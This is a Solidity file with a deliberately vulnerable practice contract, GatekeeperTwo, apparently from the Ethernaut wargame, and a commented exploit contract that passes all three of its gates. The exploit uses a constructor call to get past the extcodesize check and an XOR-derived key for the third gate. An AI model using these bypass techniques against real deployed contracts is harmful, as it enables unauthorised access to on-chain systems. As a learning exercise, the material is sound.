// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoHack {
    // gate 1 is passed by using a smart contract to call enter() instead of metamask address
    
    GatekeeperTwo ogContract = GatekeeperTwo(/* your instance address */);
    
    // gate 3 is passed by using the XOR operator on this contract's address.
    // If A ^ B = C then A ^ C = B, so we just need to XOR by the right side of the equation to get the key
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
    
    constructor() public {
        // gate 2 is passed by calling enter() inside the constructor. 
        // extcodesize registers as zero inside the constructor(because it's still creating the contract, so the contract's size is unknown)
        ogContract.enter(key);
    }
}